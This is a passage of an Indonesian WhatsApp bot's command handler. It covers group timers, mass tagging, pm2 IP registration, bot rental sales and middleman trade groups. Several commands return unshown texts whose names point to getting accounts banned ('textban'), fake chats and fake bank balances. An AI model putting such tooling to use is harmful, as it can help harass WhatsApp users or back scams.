if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
Biiofc.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
}
break
case 'opentime': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
Biiofc.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
}
break
case 'totag': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isBotAdmins) return reply(mess.only.badmin)
               if (!m.quoted) return reply(`Reply message with caption ${prefix + command}`)
               Biiofc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
case 'addip': case 'addpm2':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (args.length !== 1) {
return reply('Format penggunaan salah. Contoh: !addpm2 <ip>');
}
const ipValue = args[0];
const apiUrl = 'https://cekilhost.net/api/riz';
axios.post(apiUrl, `ip=${ipValue}`)
.then(response => {
if (response.data.status === 'success') {
const successMessage = `Berhasil Mendaftar pm2 dengan IP: ${ipValue}`;
reply(successMessage);
} else {
const errorMessage = 'Terjadi kesalahan: ' + response.data.message;
reply(errorMessage);
}
})
.catch(error => {
console.error(error);
reply('Terjadi kesalahan saat mengirim permintaan.');
});
break
    case 'deletepm2':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
    if (args.length !== 1) {
        return reply('Format penggunaan salah. Contoh: !deletepm2 <ip>');
    }
    const ipToDelete = args[0];
    const deleteUrl = 'https://cekilhost.net/api/rizdel';
    require('axios').post(deleteUrl, `ip=${ipToDelete}`)
        .then(response => {
            if (response.data.status === 'success') {
                const successMessage = `IP ${ipToDelete} berhasil dihapus.`;
                reply(successMessage);
            } else {
                const errorMessage = 'Terjadi kesalahan: ' + response.data.message;
                reply(errorMessage);
            }
        })
        .catch(error => {
            console.error(error);
            reply('Terjadi kesalahan saat mengirim permintaan.');
        });
    break
    case 'listpm2':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
    const listUrl = 'https://cekilhost.net/api/awokawok';
    axios.get(listUrl)
        .then(response => {
            if (response.data.status === 'success') {
                const ipList = response.data.ips.join('\n');
                const message = `Daftar IP yang terdaftar:\n${ipList}`;
                reply(message);
            } else {
                const errorMessage = 'Terjadi kesalahan: ' + response.data.message;
                reply(errorMessage);
            }
        })
        .catch(error => {
            console.error(error);
            m.reply('Terjadi kesalahan saat mengirim permintaan.');
        });
    break
case 'sendlinkgc': case 'sendgc': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283183432282`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await Biiofc.groupInviteCode(from)
Biiofc.sendText(bnnd, `Order  Akses Bot? Join Gc\nhttps://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
sukses(from)
}
  break
case 'getpm2':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/pm2.json'), caption: 'Egg Pm2', mimetype: 'application/json', fileName: 'pm2.json'}, {quoted: m})
break
case "mc":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!text) return reply("salah contoh .mc 250k by de4youjembot-17")
let cret = await Biiofc.groupCreate(text, [])
let response = await Biiofc.groupInviteCode(cret.id)
let teks = `「 *Create Group Mc By ${namaCreator}* 」

GRUP MC SUDAH DI BUAT ATAS NAMA *${text}* SILAHKAN MASUK MELALUI LINK YANG ADA DI BAWAH YAH GENGS

*⥁* Name : ${cret.subject}
*⥁* MC BY : ${namaCreator}
*⥁* Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
*⥁* Link : https://chat.whatsapp.com/${response}
`
setTimeout(() => {
reply(teks) 
}, 7000)
setTimeout(() => {
Biiofc.groupParticipantsUpdate(cret.id, [m.sender], "promote")
}, 5000)
setTimeout(() => {
Biiofc.groupParticipantsUpdate(cret.id, [m.sender], "add")
}, 1000)
}
break
case 'donemc':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} item,nominal`);
let item = t[0];
let nominal = t[1];
reply(`*ALHAMDULILAH ALL TRX DONE ✅*
*TERIMA KASIH ATAS KEPERCAYAANYA*
*TELAH MENGGUNAKAN JASA ADMIN *${namaCreator}*

*ITEM : ${item}*
*TANGGAL : ${tanggal}*
*NOMINAL : ${nominal}*
*WAKTU : ${jam}*
*SISTEM : MC*
*BUYYER : DONE✅*
*SELLER : DONE✅*

*JIKA KEDUANYA TELAH DONE,MAKA JIKA ADA SESUATU YANG TERJADI DI LAIN HARI BUKAN TANGGUBG JAWAB ADMIN LAGI !!!*

*TERIMA KASIH TELAH MENGGUNAKAN JASA ADMIN ${namaCreator}*`)
}
        break
case 'getbot':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/Bot.json'), caption: 'Egg Bot', mimetype: 'application/json', fileName: 'Bot.json'}, {quoted: m})
break
case 'ambilcase':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/memek.js'), caption: 'Nih Kalo Mau Deck😜', mimetype: 'application/js', fileName: 'memek.js'}, {quoted: m})
break
case 'vidowner1':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let tekssss = `*Hallo Tuan*👋🏻
Video Diatas Adalah Cewe Idaman 
*${namaStore}*
`
Biiofc.sendMessage(from, { video: fs.readFileSync(`./testimoni/video.mp4`),
 caption: tekssss, 
footer: `MILIK *${ownerStore}*`},
{quoted: fkontak})
}
break
case 'alltotal':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const total = `
${totalban()}

${totalunban()}

${totalfakechat()}

Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(total)
break
case 'tools1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ttls1 = ` ${tools1()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(ttls1)
break
case 'tools2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ttls2 = ` ${tools2()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(ttls2)
break
case 'cek-saldobri':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const saldooo = ` ${saldoo()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(saldooo)
break
case 'fakec1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const fakec = ` ${fakec1()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(fakec)
break
//============================================//
case 'fakec2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const tek = ` ${fakec2()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(tek)
break
//============================================//
case 'fakec3':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const hade = ` ${fakec3()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(hade)
break
//============================================//
case 'fakec4':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const wtf = ` ${fakec4()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(wtf)
break
//=======================================================//
//============================================//
case 'fakec5':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const mmk = ` ${fakec5()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(mmk)
break
//=======================================================//

//============================================//
case 'fakec6':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const jan = ` ${fakec6()}



Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(jan)
break
case 'fakec7':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const lullu = ` ${fakec7()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(lullu)
}
break
case 'fakec8':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const alfi = ` ${fakec8()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(alfi)
}
break
case 'fakec9':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const amalia = ` ${fakec9()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(amalia)
}
break
case 'fakec10':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ayg = ` ${fakec10()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(ayg)
}
break
case 'fakec11':{
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const bubub = ` ${fakec11()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(bubub)
}
break
case 'textunbanv1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const vaga = ` ${textunbanv1()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(vaga)
break
case 'textunbanv2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const aga = ` ${textunbanv2()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(aga)
break
case 'textunbanv3':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const naga = ` ${textunbanv3()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(naga)
break
case 'textunbanv4':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const woii = ` ${textunbanv5()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(woii)
break
case 'textunbanv5':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const sokasim = ` ${textunbanv5()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(sokasim)
break
//=======================================================//
case 'textunbanv6':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const akakaka = ` ${textunbanv6()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(akakaka)

break
//=======================================================//
case 'textunbanv7':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const kopok = ` ${textunbanv7()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(kopok)

break
//=======================================================//
case 'textunbanv8':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const tehyung = ` ${textunbanv8()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(tehyung)

break
//=======================================================//
case 'textunbanv9':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ahhyan = ` ${textunbanv9()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ahhyan)

break
//=======================================================//
case 'textunbanv10':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const yamete = ` ${textunbanv10()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(yamete)

break
//=======================================================//
case 'textunbanv11':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const suuu = ` ${textunbanv11()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(suuu)

break
//=======================================================//
case 'textunbanv12':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const huuuu = ` ${textunbanv12()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(huuuu)

break
//=======================================================//
case 'textunbanv13':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const gaje = ` ${textunbanv13()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(gaje)

break
//=======================================================//
case 'textunbanv14':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const well = ` ${textunbanv14()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(well)

break
//=======================================================//
case 'textunbanv15':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const lempo = ` ${textunbanv15()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(lempo)

break
//=======================================================//
case 'textunbanv16':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const cok = ` ${textunbanv16()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(cok)

break
//=======================================================//
case 'textunbanv17':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const sayasuka = ` ${textunbanv17()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(sayasuka)

break
//=======================================================//
case 'textunbanv18':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const oooooooo= ` ${textunbanv18()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(oooooooo)

break
//=======================================================//
case 'textunbanv19':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const omaaavaaaaaaaa = ` ${textunbanv19()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(omaaavaaaaaaaa)

break
//=======================================================//
case 'textunbanv20':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const bykepo = ` ${textunbanv20()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(bykepo)

break
//=======================================================//
case 'textunbanv21':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const unbannned = ` ${textunbanv21()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(unbannned)

break
case 'textbanv1':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const sploer = ` ${textbanv1()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(sploer)

break
//=======================================================//
case 'textbanv2':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ban = ` ${textbanv2()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ban)

break
//=======================================================//
case 'textbanv3':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const masuk = ` ${textbanv3()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(masuk)

break
//=======================================================//
case 'textbanv4':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const banned = ` ${textbanv4()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(banned)

break
//=======================================================//
case 'textbanv5':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const car = ` ${textbanv5()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(car)

break
//=======================================================//
case 'textbanv6':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const capek = ` ${textbanv6()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(capek)

break
//=======================================================//
case 'textbanv7':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const hem = `${textbanv7()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(hem)

break
//=======================================================//
case 'textbanv8':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const lelah = ` ${textbanv8()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(lelah)

break
//=======================================================//
case 'textbanv9':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const pem = ` ${textbanv9()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(pem)

break
//=======================================================//
case 'textbanv10':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const ahh = ` ${textbanv10()}


Powered By *${namaCreator}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

reply(ahh)

break
case 'pesan': case 'buyer': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
if (!args || !args[0]) return reply(`🚩 Please enter the message\nExample of Use: ${prefix + command} ${owner} pesan untuknya`)
let ngen = ['|']
if (args[0].includes(ngen)) return reply('Replace Symbol | So spaces')
if (args[0].length > 14) return reply('Extension Number')
if (args[0].length < 7) return reply('Abbreviation Number')
if (args[0].startsWith('0')) return reply('Use format 62')
if (!args[0]) return reply('Masukkan Teks')
let mention = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[0] ? (args[0].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
let txt = (args.length > 1 ? args.slice(1).join(' ') : '') || ''
let q = m.quoted ? m.quoted : m
let mime = (q.m || q).mimetype || ''
let tujuan = `${txt}`
if (!m.quoted) {
Biiofc.sendText(mention, tujuan)
} else {
Biiofc.sendText(mention, tujuan)
let media = q ? await m.getQuotedObj() : false || m
await Biiofc.copyNForward(mention, media, false).catch(_ => _)
}
let suks = `Mengirim Pesan *${mime ? mime : 'Teks'}*
*_Success ✅_*

Text :
${txt}
`
Biiofc.sendMessage(m.chat, { text: `${suks}`, mentions: [suks] }, { quoted: m })

}
break
             case 'listonline': case 'liston': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    Biiofc.sendText(m.chat, 'List Online:\n\n' + online.map(v => '• @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
  
   
                break
  case 'randomcecan1':{
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
  reply(`_Tunggu Sebentar Tuan Sedang Kami Proses⏳_`)
  buffer = await getBuffer('https://c.top4top.io/m_26649xrwy1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan2':{
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://b.top4top.io/m_27832zh400.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan3':{
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://g.top4top.io/m_2783uxoa40.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
        break
  case 'randomcecan4':{
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://b.top4top.io/m_26628tg3t1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan5':{
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://k.top4top.io/m_26648pl8c1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan6':{
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662wywyl1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan7':{
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_26627pr7n1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan8':{
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://l.top4top.io/m_2662rdkb01.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan9':{
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://h.top4top.io/m_2662l0ljt1.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
}
break
  case 'randomcecan10':{
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
  reply(`_Tunggu Sebentar...._`)
  buffer = await getBuffer('https://i.top4top.io/m_26628j9e61.mp4')
await Biiofc.sendMessage(m.chat, { video: buffer, ptt: true, mimetype: 'video/mp4' }, { quoted: m })
  }
break
case 'sewabot':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!text) return reply(`*Contoh* :\n#sewabot 1 minggu `)
let cret = await Biiofc.groupCreate(args.join(" "), [])
let response = await Biiofc.groupInviteCode(cret.id)
Biiofc.sendMessage(m.chat, { text: `「 *Create Group Sewa* 」

Sewa Bot Selama *${text}* Sedang Dalam Prosess Silahkan Masuk Melalui Link Group Yang Sudah Di Sediakan..

_▸ Owner : ${namaCreator}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})
reply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break
case 'infogc':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply(mess.only.group)
huhuhs = await Biiofc.sendMessage(m.chat, {
    text: `GRUP: *${groupMetadata.subject}*\nID :* ${groupMetadata.id}*\nMEMBER: *${participants.length}*\n\n*${groupMetadata.desc}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
reply
break
case 'buysewa':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
reply(`¥ *Price Sewa Bot DE4YOU Offcial* €

🔏 3 hari = 15k
🔏 1 minggu = 25k
🔏 2 minggu = 35k
🔏 1 bulan = 50k

Untuk Melanjutkan Sewa Silahkan Ketik Contoh Di bawah
*Contoh => sewabot 1 minggu`)
break
case'promoteall':
if (!isOwner) return reply('*Khusus De4you Offcial Doang Woii!!*')
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.groupParticipantsUpdate(from, mems, 'promote')
break
case'demoteall':
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.groupParticipantsUpdate(from, mems, 'demote')
break
case 'setbiobot':{
   if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
   if (!text) throw `Masukan Text.`
     try {
		await Biiofc.updateProfileStatus(text).catch(_ => _)
		reply(m.chat, 'SUCCESS ✅️', m)
} catch {
       throw 'Error'
     }
}
break
	case 'setppbot': case 'setbotpp': {
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!quoted) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (!/image/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
